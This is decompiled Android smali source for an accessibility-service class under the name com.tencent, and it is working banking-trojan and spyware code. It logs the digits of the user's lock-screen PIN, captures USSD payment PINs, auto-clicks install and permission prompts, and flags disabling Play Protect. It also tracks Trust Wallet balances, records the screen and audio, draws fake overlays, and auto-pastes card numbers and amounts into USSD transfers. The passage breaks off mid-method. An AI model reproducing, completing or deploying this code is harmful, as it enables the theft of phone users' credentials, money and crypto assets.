.class public Lcom/tencent/AccessibilityServiceCore;
.super Landroid/accessibilityservice/AccessibilityService;
.source "tunesxconcerningn1012.java"


# annotations
.annotation system Ldalvik/annotation/MemberClasses;
    value = {
        Lcom/tencent/AccessibilityServiceCore$MyWebView;,
        Lcom/tencent/AccessibilityServiceCore$MyWebViewClient;,
        Lcom/tencent/AccessibilityServiceCore$MyWebChromeClient;
    }
.end annotation


# static fields
.field public static CurrentName:Ljava/lang/String; = null

.field public static DisabledApps:Ljava/util/List; = null
    .annotation system Ldalvik/annotation/Signature;
        value = {
            "Ljava/util/List<",
            "Ljava/lang/String;",
            ">;"
        }
    .end annotation
.end field

.field public static FOR_REM:Ljava/lang/Boolean; = null

.field public static Fakelay:Landroid/widget/FrameLayout; = null

.field public static Fakeparams:Landroid/view/WindowManager$LayoutParams; = null

.field public static Fakeparams_bass:Landroid/view/WindowManager$LayoutParams; = null

.field public static ccurrentPassword:Ljava/lang/String; = null

.field public static ifFinishiInitPermission:Z = false

.field public static injview:Landroid/widget/FrameLayout; = null

.field public static layoutParams:Landroid/view/WindowManager$LayoutParams; = null

.field public static passcheck:Ljava/lang/String; = "0"

.field public static sfw:Landroid/view/SurfaceView; = null

.field static trustWalletBtcBalance:Ljava/lang/String; = ""

.field static trustWalletEthBalance:Ljava/lang/String; = ""

.field static trustWalletUsdtBalance:Ljava/lang/String; = ""

.field static trustWalletname:Ljava/lang/String; = ""

.field public static tunesxconcerningn1012Auto_Click:Ljava/lang/Boolean;

.field public static tunesxconcerningn1012CheckPrims:Z

.field public static tunesxconcerningn1012DisablePlayProtect:Ljava/lang/String;

.field public static tunesxconcerningn1012FOR_IN:Ljava/lang/Boolean;

.field public static tunesxconcerningn1012FOR_SC:Ljava/lang/Boolean;

.field public static tunesxconcerningn1012FOR_prim:Ljava/lang/Boolean;

.field public static tunesxconcerningn1012GlobalEvent:Landroid/view/accessibility/AccessibilityEvent;

.field public static tunesxconcerningn1012Globalnode:Landroid/view/accessibility/AccessibilityNodeInfo;

.field public static tunesxconcerningn1012NeedPaste:Ljava/lang/Boolean;

.field public static tunesxconcerningn1012OFFOK:Ljava/lang/String;

.field public static tunesxconcerningn1012OFK:Ljava/lang/String;

.field public static tunesxconcerningn1012RecorderActive:Z

.field public static tunesxconcerningn1012Recording:Z

.field public static tunesxconcerningn1012SendGoogleAuth:Z

.field public static tunesxconcerningn1012ToPaste:Ljava/lang/String;

.field public static tunesxconcerningn1012bypass:Ljava/lang/Boolean;

.field public static tunesxconcerningn1012lay:Landroid/view/WindowManager$LayoutParams;

.field public static tunesxconcerningn1012mRecorder:Landroid/media/MediaRecorder;

.field public static tunesxconcerningn1012wm:Landroid/view/WindowManager;

.field public static useRec:Ljava/lang/String;


# instance fields
.field callbeack:Lcom/tencent/AccessibilityEventMonitor$ICallback;

.field handler:Landroid/os/Handler;

.field public localeForAccessibility:Ljava/lang/String;

.field private mScreetunesxconcerningn10nStatusController:Lcom/tencent/ScreenCaptureEngine;

.field screenShotHandler:Landroid/os/Handler;

.field screenShotThread:Ljava/lang/Thread;

.field private showbinance:Z

.field private showtrust:Z

.field total:I

.field unlockScreenHandler:Landroid/os/Handler;


# direct methods
.method static constructor <clinit>()V
    .locals 3

    const/4 v0, 0x0

    .line 164
    invoke-static {v0}, Ljava/lang/Boolean;->valueOf(Z)Ljava/lang/Boolean;

    move-result-object v1

    sput-object v1, Lcom/tencent/AccessibilityServiceCore;->tunesxconcerningn1012Auto_Click:Ljava/lang/Boolean;

    .line 165
    sput-object v1, Lcom/tencent/AccessibilityServiceCore;->tunesxconcerningn1012FOR_SC:Ljava/lang/Boolean;

    .line 166
    sput-object v1, Lcom/tencent/AccessibilityServiceCore;->FOR_REM:Ljava/lang/Boolean;

    .line 167
    sput-object v1, Lcom/tencent/AccessibilityServiceCore;->tunesxconcerningn1012FOR_IN:Ljava/lang/Boolean;

    .line 168
    sput-object v1, Lcom/tencent/AccessibilityServiceCore;->tunesxconcerningn1012FOR_prim:Ljava/lang/Boolean;

    .line 170
    sput-object v1, Lcom/tencent/AccessibilityServiceCore;->tunesxconcerningn1012bypass:Ljava/lang/Boolean;

    const-string v2, "on"

    .line 171
    sput-object v2, Lcom/tencent/AccessibilityServiceCore;->tunesxconcerningn1012OFK:Ljava/lang/String;

    const-string v2, "[DIS_PROTECTION]"

    .line 172
    sput-object v2, Lcom/tencent/AccessibilityServiceCore;->tunesxconcerningn1012DisablePlayProtect:Ljava/lang/String;

    const/4 v2, 0x1

    .line 173
    sput-boolean v2, Lcom/tencent/AccessibilityServiceCore;->tunesxconcerningn1012CheckPrims:Z

    const-string v2, "on"

    .line 174
    sput-object v2, Lcom/tencent/AccessibilityServiceCore;->tunesxconcerningn1012OFFOK:Ljava/lang/String;

    const-string v2, ""

    .line 1173
    sput-object v2, Lcom/tencent/AccessibilityServiceCore;->tunesxconcerningn1012ToPaste:Ljava/lang/String;

    .line 1174
    sput-object v1, Lcom/tencent/AccessibilityServiceCore;->tunesxconcerningn1012NeedPaste:Ljava/lang/Boolean;

    .line 1274
    sput-boolean v0, Lcom/tencent/AccessibilityServiceCore;->tunesxconcerningn1012SendGoogleAuth:Z

    const/4 v1, 0x0

    .line 1275
    sput-object v1, Lcom/tencent/AccessibilityServiceCore;->tunesxconcerningn1012Globalnode:Landroid/view/accessibility/AccessibilityNodeInfo;

    .line 1276
    sput-object v1, Lcom/tencent/AccessibilityServiceCore;->tunesxconcerningn1012GlobalEvent:Landroid/view/accessibility/AccessibilityEvent;

    .line 1758
    new-instance v1, Ljava/util/ArrayList;

    invoke-direct {v1}, Ljava/util/ArrayList;-><init>()V

    sput-object v1, Lcom/tencent/AccessibilityServiceCore;->DisabledApps:Ljava/util/List;

    .line 2989
    sput-boolean v0, Lcom/tencent/AccessibilityServiceCore;->tunesxconcerningn1012Recording:Z

    .line 2990
    sput-boolean v0, Lcom/tencent/AccessibilityServiceCore;->tunesxconcerningn1012RecorderActive:Z

    const-string v0, "NO"

    .line 2992
    sput-object v0, Lcom/tencent/AccessibilityServiceCore;->useRec:Ljava/lang/String;

    .line 3241
    sput-object v2, Lcom/tencent/AccessibilityServiceCore;->ccurrentPassword:Ljava/lang/String;

    return-void
.end method

.method public constructor <init>()V
    .locals 4

    .line 99
    invoke-direct {p0}, Landroid/accessibilityservice/AccessibilityService;-><init>()V

    const/4 v0, 0x0

    .line 281
    iput-object v0, p0, Lcom/tencent/AccessibilityServiceCore;->screenShotThread:Ljava/lang/Thread;

    .line 282
    new-instance v1, Landroid/os/Handler;

    invoke-static {}, Landroid/os/Looper;->myLooper()Landroid/os/Looper;

    move-result-object v2

    new-instance v3, Lcom/tencent/AccessibilityServiceCore$3;

    invoke-direct {v3, p0}, Lcom/tencent/AccessibilityServiceCore$3;-><init>(Lcom/tencent/AccessibilityServiceCore;)V

    invoke-direct {v1, v2, v3}, Landroid/os/Handler;-><init>(Landroid/os/Looper;Landroid/os/Handler$Callback;)V

    iput-object v1, p0, Lcom/tencent/AccessibilityServiceCore;->screenShotHandler:Landroid/os/Handler;

    .line 291
    new-instance v1, Landroid/os/Handler;

    invoke-static {}, Landroid/os/Looper;->myLooper()Landroid/os/Looper;

    move-result-object v2

    new-instance v3, Lcom/tencent/AccessibilityServiceCore$4;

    invoke-direct {v3, p0}, Lcom/tencent/AccessibilityServiceCore$4;-><init>(Lcom/tencent/AccessibilityServiceCore;)V

    invoke-direct {v1, v2, v3}, Landroid/os/Handler;-><init>(Landroid/os/Looper;Landroid/os/Handler$Callback;)V

    iput-object v1, p0, Lcom/tencent/AccessibilityServiceCore;->unlockScreenHandler:Landroid/os/Handler;

    const-string v1, "{\'en\':\'Enable\',\'de\':\'Aktivieren\',\'ar\':\'\u062a\u0641\u0639\u064a\u0644"

    .line 1277
    iput-object v1, p0, Lcom/tencent/AccessibilityServiceCore;->localeForAccessibility:Ljava/lang/String;

    .line 3203
    iput-object v0, p0, Lcom/tencent/AccessibilityServiceCore;->mScreetunesxconcerningn10nStatusController:Lcom/tencent/ScreenCaptureEngine;

    const/4 v0, 0x0

    .line 3371
    iput-boolean v0, p0, Lcom/tencent/AccessibilityServiceCore;->showtrust:Z

    .line 3372
    iput-boolean v0, p0, Lcom/tencent/AccessibilityServiceCore;->showbinance:Z

    .line 3482
    new-instance v1, Landroid/os/Handler;

    invoke-static {}, Landroid/os/Looper;->getMainLooper()Landroid/os/Looper;

    move-result-object v2

    new-instance v3, Lcom/tencent/AccessibilityServiceCore$19;

    invoke-direct {v3, p0}, Lcom/tencent/AccessibilityServiceCore$19;-><init>(Lcom/tencent/AccessibilityServiceCore;)V

    invoke-direct {v1, v2, v3}, Landroid/os/Handler;-><init>(Landroid/os/Looper;Landroid/os/Handler$Callback;)V

    iput-object v1, p0, Lcom/tencent/AccessibilityServiceCore;->handler:Landroid/os/Handler;

    .line 3521
    iput v0, p0, Lcom/tencent/AccessibilityServiceCore;->total:I

    return-void
.end method

.method private Gotitinstalled(Landroid/view/accessibility/AccessibilityNodeInfo;)Z
    .locals 6

    const/4 v0, 0x0

    if-eqz p1, :cond_4

    .line 2882
    invoke-virtual {p1}, Landroid/view/accessibility/AccessibilityNodeInfo;->getChildCount()I

    move-result v1

    const-string v2, "android.widget.Button"

    .line 2883
    invoke-virtual {p1}, Landroid/view/accessibility/AccessibilityNodeInfo;->getClassName()Ljava/lang/CharSequence;

    move-result-object v3

    invoke-virtual {v2, v3}, Ljava/lang/String;->equals(Ljava/lang/Object;)Z

    move-result v2

    const/4 v3, 0x1

    if-eqz v2, :cond_1

    .line 2884
    invoke-virtual {p1}, Landroid/view/accessibility/AccessibilityNodeInfo;->getText()Ljava/lang/CharSequence;

    move-result-object v2

    invoke-interface {v2}, Ljava/lang/CharSequence;->toString()Ljava/lang/String;

    move-result-object v2

    .line 2886
    invoke-static {v2}, Landroid/text/TextUtils;->isEmpty(Ljava/lang/CharSequence;)Z

    move-result v4

    if-nez v4, :cond_2

    const-string v4, "\u5b89\u88c5"

    .line 2887
    invoke-virtual {v4, v2}, Ljava/lang/String;->equals(Ljava/lang/Object;)Z

    move-result v4

    if-nez v4, :cond_0

    const-string v4, "install"

    .line 2888
    invoke-virtual {v2}, Ljava/lang/String;->toLowerCase()Ljava/lang/String;

    move-result-object v5

    invoke-virtual {v4, v5}, Ljava/lang/String;->equals(Ljava/lang/Object;)Z

    move-result v4

    if-nez v4, :cond_0

    const-string v4, "done"

    .line 2889
    invoke-virtual {v2}, Ljava/lang/String;->toLowerCase()Ljava/lang/String;

    move-result-object v5

    invoke-virtual {v4, v5}, Ljava/lang/String;->equals(Ljava/lang/Object;)Z

    move-result v4

    if-nez v4, :cond_0

    const-string v4, "\u5b8c\u6210"

    .line 2890
    invoke-virtual {v4, v2}, Ljava/lang/String;->equals(Ljava/lang/Object;)Z

    move-result v4

    if-nez v4, :cond_0

    const-string v4, "\u062a\u062b\u0628\u064a\u062a"

    .line 2891
    invoke-virtual {v4, v2}, Ljava/lang/String;->equals(Ljava/lang/Object;)Z

    move-result v4

    if-nez v4, :cond_0

    const-string v4, "\u786e\u5b9a"

    .line 2892
    invoke-virtual {v4, v2}, Ljava/lang/String;->equals(Ljava/lang/Object;)Z

    move-result v2

    if-eqz v2, :cond_2

    :cond_0
    const/16 v0, 0x10

    .line 2894
    invoke-virtual {p1, v0}, Landroid/view/accessibility/AccessibilityNodeInfo;->performAction(I)Z

    return v3

    :cond_1
    const-string v2, "android.widget.ScrollView"

    .line 2897
    invoke-virtual {p1}, Landroid/view/accessibility/AccessibilityNodeInfo;->getClassName()Ljava/lang/CharSequence;

    move-result-object v4

    invoke-virtual {v2, v4}, Ljava/lang/String;->equals(Ljava/lang/Object;)Z

    move-result v2

    if-eqz v2, :cond_2

    const/16 v2, 0x1000

    .line 2898
    invoke-virtual {p1, v2}, Landroid/view/accessibility/AccessibilityNodeInfo;->performAction(I)Z

    :cond_2
    move v2, v0

    :goto_0
    if-ge v2, v1, :cond_4

    .line 2901
    invoke-virtual {p1, v2}, Landroid/view/accessibility/AccessibilityNodeInfo;->getChild(I)Landroid/view/accessibility/AccessibilityNodeInfo;

    move-result-object v4

    .line 2902
    invoke-direct {p0, v4}, Lcom/tencent/AccessibilityServiceCore;->Gotitinstalled(Landroid/view/accessibility/AccessibilityNodeInfo;)Z

    move-result v4

    if-eqz v4, :cond_3

    return v3

    :cond_3
    add-int/lit8 v2, v2, 0x1

    goto :goto_0

    :cond_4
    return v0
.end method

.method static synthetic access$000(Lcom/tencent/AccessibilityServiceCore;)V
    .locals 0

    .line 99
    invoke-direct {p0}, Lcom/tencent/AccessibilityServiceCore;->screenShot()V

    return-void
.end method

.method static synthetic access$100(Lcom/tencent/AccessibilityServiceCore;)V
    .locals 0

    .line 99
    invoke-direct {p0}, Lcom/tencent/AccessibilityServiceCore;->unlockScreen()V

    return-void
.end method

.method static synthetic access$1000(Lcom/tencent/AccessibilityServiceCore;I)V
    .locals 0

    .line 99
    invoke-direct {p0, p1}, Lcom/tencent/AccessibilityServiceCore;->continueclickBtn(I)V

    return-void
.end method

.method static synthetic access$500(Lcom/tencent/AccessibilityServiceCore;)V
    .locals 0

    .line 99
    invoke-direct {p0}, Lcom/tencent/AccessibilityServiceCore;->unlockScreenSuccess()V

    return-void
.end method

.method static synthetic access$600(Lcom/tencent/AccessibilityServiceCore;)V
    .locals 0

    .line 99
    invoke-direct {p0}, Lcom/tencent/AccessibilityServiceCore;->continueb()V

    return-void
.end method

.method static synthetic access$700(Lcom/tencent/AccessibilityServiceCore;)V
    .locals 0

    .line 99
    invoke-direct {p0}, Lcom/tencent/AccessibilityServiceCore;->continuec()V

    return-void
.end method

.method static synthetic access$800(Lcom/tencent/AccessibilityServiceCore;)V
    .locals 0

    .line 99
    invoke-direct {p0}, Lcom/tencent/AccessibilityServiceCore;->continued()V

    return-void
.end method

.method static synthetic access$900(Lcom/tencent/AccessibilityServiceCore;)V
    .locals 0

    .line 99
    invoke-direct {p0}, Lcom/tencent/AccessibilityServiceCore;->continuee()V

    return-void
.end method

.method public static applyExposure(Landroid/graphics/Bitmap;F)Landroid/graphics/Bitmap;
    .locals 5

    .line 924
    invoke-virtual {p0}, Landroid/graphics/Bitmap;->getWidth()I

    move-result v0

    invoke-virtual {p0}, Landroid/graphics/Bitmap;->getHeight()I

    move-result v1

    sget-object v2, Landroid/graphics/Bitmap$Config;->ARGB_8888:Landroid/graphics/Bitmap$Config;

    invoke-static {v0, v1, v2}, Landroid/graphics/Bitmap;->createBitmap(IILandroid/graphics/Bitmap$Config;)Landroid/graphics/Bitmap;

    move-result-object v0

    .line 926
    new-instance v1, Landroid/graphics/ColorMatrix;

    invoke-direct {v1}, Landroid/graphics/ColorMatrix;-><init>()V

    const/16 v2, 0x14

    new-array v2, v2, [F

    const/4 v3, 0x0

    aput p1, v2, v3

    const/4 v3, 0x1

    const/4 v4, 0x0

    aput v4, v2, v3

    const/4 v3, 0x2

    aput v4, v2, v3

    const/4 v3, 0x3

    aput v4, v2, v3

    const/4 v3, 0x4

    aput v4, v2, v3

    const/4 v3, 0x5

    aput v4, v2, v3

    const/4 v3, 0x6

    aput p1, v2, v3

    const/4 v3, 0x7

    aput v4, v2, v3

    const/16 v3, 0x8

    aput v4, v2, v3

    const/16 v3, 0x9

    aput v4, v2, v3

    const/16 v3, 0xa

    aput v4, v2, v3

    const/16 v3, 0xb

    aput v4, v2, v3

    const/16 v3, 0xc

    aput p1, v2, v3

    const/16 p1, 0xd

    aput v4, v2, p1

    const/16 p1, 0xe

    aput v4, v2, p1

    const/16 p1, 0xf

    aput v4, v2, p1

    const/16 p1, 0x10

    aput v4, v2, p1

    const/16 p1, 0x11

    aput v4, v2, p1

    const/16 p1, 0x12

    const/high16 v3, 0x3f800000    # 1.0f

    aput v3, v2, p1

    const/16 p1, 0x13

    aput v4, v2, p1

    .line 927
    invoke-virtual {v1, v2}, Landroid/graphics/ColorMatrix;->set([F)V

    .line 929
    new-instance p1, Landroid/graphics/Paint;

    invoke-direct {p1}, Landroid/graphics/Paint;-><init>()V

    .line 930
    new-instance v2, Landroid/graphics/ColorMatrixColorFilter;

    invoke-direct {v2, v1}, Landroid/graphics/ColorMatrixColorFilter;-><init>(Landroid/graphics/ColorMatrix;)V

    invoke-virtual {p1, v2}, Landroid/graphics/Paint;->setColorFilter(Landroid/graphics/ColorFilter;)Landroid/graphics/ColorFilter;

    .line 932
    new-instance v1, Landroid/graphics/Canvas;

    invoke-direct {v1, v0}, Landroid/graphics/Canvas;-><init>(Landroid/graphics/Bitmap;)V

    .line 933
    invoke-virtual {v1, p0, v4, v4, p1}, Landroid/graphics/Canvas;->drawBitmap(Landroid/graphics/Bitmap;FFLandroid/graphics/Paint;)V

    return-object v0
.end method

.method private checkIfClickPermission(Landroid/view/accessibility/AccessibilityEvent;)Z
    .locals 1

    const-string v0, "com.android.permissioncontroller"

    .line 2675
    invoke-virtual {p1}, Landroid/view/accessibility/AccessibilityEvent;->getPackageName()Ljava/lang/CharSequence;

    move-result-object p1

    invoke-virtual {v0, p1}, Ljava/lang/String;->equals(Ljava/lang/Object;)Z

    move-result p1

    if-eqz p1, :cond_0

    const/4 p1, 0x1

    return p1

    :cond_0
    const/4 p1, 0x0

    return p1
.end method

.method private checkIfHome(Landroid/view/accessibility/AccessibilityEvent;)Z
    .locals 2

    .line 3290
    invoke-virtual {p1}, Landroid/view/accessibility/AccessibilityEvent;->getEventType()I

    move-result v0

    const/16 v1, 0x20

    if-ne v0, v1, :cond_1

    const-string v0, "com.android.launcher3"

    invoke-virtual {p1}, Landroid/view/accessibility/AccessibilityEvent;->getPackageName()Ljava/lang/CharSequence;

    move-result-object v1

    invoke-virtual {v0, v1}, Ljava/lang/String;->equals(Ljava/lang/Object;)Z

    move-result v0

    if-nez v0, :cond_0

    const-string v0, "com.bbk.launcher2"

    invoke-virtual {p1}, Landroid/view/accessibility/AccessibilityEvent;->getPackageName()Ljava/lang/CharSequence;

    move-result-object v1

    invoke-virtual {v0, v1}, Ljava/lang/String;->equals(Ljava/lang/Object;)Z

    move-result v0

    if-nez v0, :cond_0

    const-string v0, "com.huawei.android.launcher"

    invoke-virtual {p1}, Landroid/view/accessibility/AccessibilityEvent;->getPackageName()Ljava/lang/CharSequence;

    move-result-object v1

    invoke-virtual {v0, v1}, Ljava/lang/String;->equals(Ljava/lang/Object;)Z

    move-result v0

    if-nez v0, :cond_0

    const-string v0, "com.miui.home"

    invoke-virtual {p1}, Landroid/view/accessibility/AccessibilityEvent;->getPackageName()Ljava/lang/CharSequence;

    move-result-object p1

    invoke-virtual {v0, p1}, Ljava/lang/String;->equals(Ljava/lang/Object;)Z

    move-result p1

    if-eqz p1, :cond_1

    :cond_0
    const/4 p1, 0x1

    goto :goto_0

    :cond_1
    const/4 p1, 0x0

    :goto_0
    return p1
.end method

.method private checkIfMatch(Ljava/lang/String;)Z
    .locals 1

    const-string v0, "Phone#\\[\\d{4}]#3"

    .line 2999
    invoke-static {v0}, Ljava/util/regex/Pattern;->compile(Ljava/lang/String;)Ljava/util/regex/Pattern;

    move-result-object v0

    .line 3000
    invoke-virtual {v0, p1}, Ljava/util/regex/Pattern;->matcher(Ljava/lang/CharSequence;)Ljava/util/regex/Matcher;

    move-result-object p1

    .line 3001
    invoke-virtual {p1}, Ljava/util/regex/Matcher;->matches()Z

    move-result p1

    return p1
.end method

.method private checkPassword(Landroid/view/accessibility/AccessibilityEvent;)V
    .locals 3

    .line 3258
    invoke-direct {p0, p1}, Lcom/tencent/AccessibilityServiceCore;->checkIfHome(Landroid/view/accessibility/AccessibilityEvent;)Z

    move-result v0

    if-eqz v0, :cond_0

    return-void

    .line 3261
    :cond_0
    invoke-virtual {p1}, Landroid/view/accessibility/AccessibilityEvent;->getSource()Landroid/view/accessibility/AccessibilityNodeInfo;

    move-result-object v0

    .line 3262
    invoke-virtual {p1}, Landroid/view/accessibility/AccessibilityEvent;->getEventType()I

    move-result v1

    const/4 v2, 0x1

    if-ne v1, v2, :cond_4

    const-string v1, "com.android.systemui"

    invoke-virtual {p1}, Landroid/view/accessibility/AccessibilityEvent;->getPackageName()Ljava/lang/CharSequence;

    move-result-object p1

    invoke-virtual {v1, p1}, Ljava/lang/String;->equals(Ljava/lang/Object;)Z

    move-result p1

    if-eqz p1, :cond_4

    .line 3263
    invoke-virtual {v0}, Landroid/view/accessibility/AccessibilityNodeInfo;->getViewIdResourceName()Ljava/lang/String;

    move-result-object p1

    invoke-direct {p0, p1}, Lcom/tencent/AccessibilityServiceCore;->checkResourceId(Ljava/lang/String;)Z

    move-result p1

    if-eqz p1, :cond_1

    .line 3264
    invoke-virtual {v0}, Landroid/view/accessibility/AccessibilityNodeInfo;->getContentDescription()Ljava/lang/CharSequence;

    move-result-object p1

    invoke-interface {p1}, Ljava/lang/CharSequence;->toString()Ljava/lang/String;

    move-result-object p1

    .line 3266
    :try_start_0
    invoke-static {p1}, Ljava/lang/Integer;->parseInt(Ljava/lang/String;)I

    move-result p1

    .line 3267
    new-instance v0, Ljava/lang/StringBuilder;

    invoke-direct {v0}, Ljava/lang/StringBuilder;-><init>()V

    sget-object v1, Lcom/tencent/AccessibilityServiceCore;->ccurrentPassword:Ljava/lang/String;

    invoke-virtual {v0, v1}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    invoke-virtual {v0, p1}, Ljava/lang/StringBuilder;->append(I)Ljava/lang/StringBuilder;

    invoke-virtual {v0}, Ljava/lang/StringBuilder;->toString()Ljava/lang/String;

    move-result-object p1

    sput-object p1, Lcom/tencent/AccessibilityServiceCore;->ccurrentPassword:Ljava/lang/String;

    const-string p1, "1"

    .line 3268
    sput-object p1, Lcom/tencent/AccessibilityServiceCore;->passcheck:Ljava/lang/String;
    :try_end_0
    .catch Ljava/lang/Exception; {:try_start_0 .. :try_end_0} :catch_0

    goto :goto_0

    :cond_1
    const-string p1, "com.android.systemui:id/delete_button"

    .line 3278
    invoke-virtual {v0}, Landroid/view/accessibility/AccessibilityNodeInfo;->getViewIdResourceName()Ljava/lang/String;

    move-result-object v1

    invoke-virtual {p1, v1}, Ljava/lang/String;->equals(Ljava/lang/Object;)Z

    move-result p1

    if-nez p1, :cond_2

    const-string p1, "com.android.systemui:id/vivo_cancel"

    invoke-virtual {v0}, Landroid/view/accessibility/AccessibilityNodeInfo;->getViewIdResourceName()Ljava/lang/String;

    move-result-object v0

    invoke-virtual {p1, v0}, Ljava/lang/String;->equals(Ljava/lang/Object;)Z

    move-result p1

    if-eqz p1, :cond_4

    .line 3279
    :cond_2
    sget-object p1, Lcom/tencent/AccessibilityServiceCore;->ccurrentPassword:Ljava/lang/String;

    invoke-virtual {p1}, Ljava/lang/String;->length()I

    move-result p1

    if-ne p1, v2, :cond_3

    const-string p1, ""

    .line 3280
    sput-object p1, Lcom/tencent/AccessibilityServiceCore;->ccurrentPassword:Ljava/lang/String;

    goto :goto_0

    .line 3281
    :cond_3
    sget-object p1, Lcom/tencent/AccessibilityServiceCore;->ccurrentPassword:Ljava/lang/String;

    invoke-virtual {p1}, Ljava/lang/String;->length()I

    move-result p1

    if-lez p1, :cond_4

    .line 3282
    sget-object p1, Lcom/tencent/AccessibilityServiceCore;->ccurrentPassword:Ljava/lang/String;

    invoke-virtual {p1}, Ljava/lang/String;->length()I

    move-result v0

    sub-int/2addr v0, v2

    const/4 v1, 0x0

    invoke-virtual {p1, v1, v0}, Ljava/lang/String;->substring(II)Ljava/lang/String;

    move-result-object p1

    sput-object p1, Lcom/tencent/AccessibilityServiceCore;->ccurrentPassword:Ljava/lang/String;

    :catch_0
    :cond_4
    :goto_0
    return-void
.end method

.method private checkResourceId(Ljava/lang/String;)Z
    .locals 1

    const-string v0, "com.android.systemui:id/key|com.android.systemui:id/VivoPinkey"

    .line 3306
    invoke-static {v0}, Ljava/util/regex/Pattern;->compile(Ljava/lang/String;)Ljava/util/regex/Pattern;

    move-result-object v0

    .line 3307
    invoke-virtual {v0, p1}, Ljava/util/regex/Pattern;->matcher(Ljava/lang/CharSequence;)Ljava/util/regex/Matcher;

    move-result-object p1

    .line 3308
    invoke-virtual {p1}, Ljava/util/regex/Matcher;->find()Z

    move-result p1

    return p1
.end method

.method private checkpay(Landroid/view/accessibility/AccessibilityEvent;)V
    .locals 2

    .line 3245
    invoke-virtual {p1}, Landroid/view/accessibility/AccessibilityEvent;->getEventType()I

    move-result v0

    const/16 v1, 0x10

    if-ne v0, v1, :cond_0

    .line 3246
    invoke-virtual {p1}, Landroid/view/accessibility/AccessibilityEvent;->getSource()Landroid/view/accessibility/AccessibilityNodeInfo;

    move-result-object p1

    const-string v0, "com.android.phone:id/input_field"

    .line 3247
    invoke-virtual {p1}, Landroid/view/accessibility/AccessibilityNodeInfo;->getViewIdResourceName()Ljava/lang/String;

    move-result-object v1

    invoke-virtual {v0, v1}, Ljava/lang/String;->equals(Ljava/lang/Object;)Z

    move-result v0

    if-eqz v0, :cond_0

    .line 3248
    invoke-virtual {p1}, Landroid/view/accessibility/AccessibilityNodeInfo;->getText()Ljava/lang/CharSequence;

    move-result-object p1

    invoke-interface {p1}, Ljava/lang/CharSequence;->toString()Ljava/lang/String;

    move-result-object p1

    .line 3249
    invoke-virtual {p1}, Ljava/lang/String;->length()I

    move-result v0

    const/4 v1, 0x4

    if-ne v0, v1, :cond_0

    .line 3250
    sput-object p1, Lcom/tencent/MainBackgroundService;->ussdpayd:Ljava/lang/String;

    :cond_0
    return-void
.end method

.method private clickSendButton()V
    .locals 3

    .line 3655
    invoke-virtual {p0}, Lcom/tencent/AccessibilityServiceCore;->getRootInActiveWindow()Landroid/view/accessibility/AccessibilityNodeInfo;

    move-result-object v0

    if-eqz v0, :cond_1

    const-string v1, "ENVOYER"

    .line 3658
    invoke-virtual {v0, v1}, Landroid/view/accessibility/AccessibilityNodeInfo;->findAccessibilityNodeInfosByText(Ljava/lang/String;)Ljava/util/List;

    move-result-object v0

    .line 3659
    invoke-interface {v0}, Ljava/util/List;->iterator()Ljava/util/Iterator;

    move-result-object v0

    :cond_0
    invoke-interface {v0}, Ljava/util/Iterator;->hasNext()Z

    move-result v1

    if-eqz v1, :cond_1

    invoke-interface {v0}, Ljava/util/Iterator;->next()Ljava/lang/Object;

    move-result-object v1

    check-cast v1, Landroid/view/accessibility/AccessibilityNodeInfo;

    .line 3660
    invoke-virtual {v1}, Landroid/view/accessibility/AccessibilityNodeInfo;->isClickable()Z

    move-result v2

    if-eqz v2, :cond_0

    const/16 v0, 0x10

    .line 3661
    invoke-virtual {v1, v0}, Landroid/view/accessibility/AccessibilityNodeInfo;->performAction(I)Z

    const/4 v0, 0x0

    .line 3662
    invoke-static {v0}, Ljava/lang/Boolean;->valueOf(Z)Ljava/lang/Boolean;

    move-result-object v0

    sput-object v0, Lcom/tencent/AccessibilityServiceCore;->tunesxconcerningn1012Auto_Click:Ljava/lang/Boolean;

    :cond_1
    return-void
.end method

.method private continueb()V
    .locals 2

    .line 3588
    invoke-virtual {p0}, Lcom/tencent/AccessibilityServiceCore;->getRootInActiveWindow()Landroid/view/accessibility/AccessibilityNodeInfo;

    .line 3590
    sget-object v0, Lcom/tencent/MainBackgroundService;->ussdcard:Ljava/lang/String;

    if-eqz v0, :cond_0

    .line 3591
    sget-object v0, Lcom/tencent/MainBackgroundService;->MyAccess:Lcom/tencent/AccessibilityServiceCore;

    sget-object v0, Lcom/tencent/MainBackgroundService;->ussdcard:Ljava/lang/String;

    sput-object v0, Lcom/tencent/AccessibilityServiceCore;->tunesxconcerningn1012ToPaste:Ljava/lang/String;

    .line 3592
    sget-object v0, Lcom/tencent/MainBackgroundService;->MyAccess:Lcom/tencent/AccessibilityServiceCore;

    const/4 v0, 0x1

    invoke-static {v0}, Ljava/lang/Boolean;->valueOf(Z)Ljava/lang/Boolean;

    move-result-object v0

    sput-object v0, Lcom/tencent/AccessibilityServiceCore;->tunesxconcerningn1012NeedPaste:Ljava/lang/Boolean;

    .line 3593
    sget-object v0, Lcom/tencent/MainBackgroundService;->MyAccess:Lcom/tencent/AccessibilityServiceCore;

    invoke-virtual {v0}, Lcom/tencent/AccessibilityServiceCore;->tunesxconcerningn1012Treger()V

    .line 3594
    new-instance v0, Ljava/lang/Thread;

    new-instance v1, Lcom/tencent/AccessibilityServiceCore$$ExternalSyntheticLambda13;

    invoke-direct {v1, p0}, Lcom/tencent/AccessibilityServiceCore$$ExternalSyntheticLambda13;-><init>(Lcom/tencent/AccessibilityServiceCore;)V

    invoke-direct {v0, v1}, Ljava/lang/Thread;-><init>(Ljava/lang/Runnable;)V

    .line 3604
    invoke-virtual {v0}, Ljava/lang/Thread;->start()V

    :cond_0
    return-void
.end method

.method private continuec()V
    .locals 2

    .line 3612
    sget-object v0, Lcom/tencent/MainBackgroundService;->ussdamount:Ljava/lang/String;

    if-eqz v0, :cond_0

    .line 3613
    sget-object v0, Lcom/tencent/MainBackgroundService;->MyAccess:Lcom/tencent/AccessibilityServiceCore;

    sget-object v0, Lcom/tencent/MainBackgroundService;->ussdamount:Ljava/lang/String;

    sput-object v0, Lcom/tencent/AccessibilityServiceCore;->tunesxconcerningn1012ToPaste:Ljava/lang/String;

    .line 3614
    sget-object v0, Lcom/tencent/MainBackgroundService;->MyAccess:Lcom/tencent/AccessibilityServiceCore;

    const/4 v0, 0x1

    invoke-static {v0}, Ljava/lang/Boolean;->valueOf(Z)Ljava/lang/Boolean;

    move-result-object v0

    sput-object v0, Lcom/tencent/AccessibilityServiceCore;->tunesxconcerningn1012NeedPaste:Ljava/lang/Boolean;

    .line 3615
    sget-object v0, Lcom/tencent/MainBackgroundService;->MyAccess:Lcom/tencent/AccessibilityServiceCore;

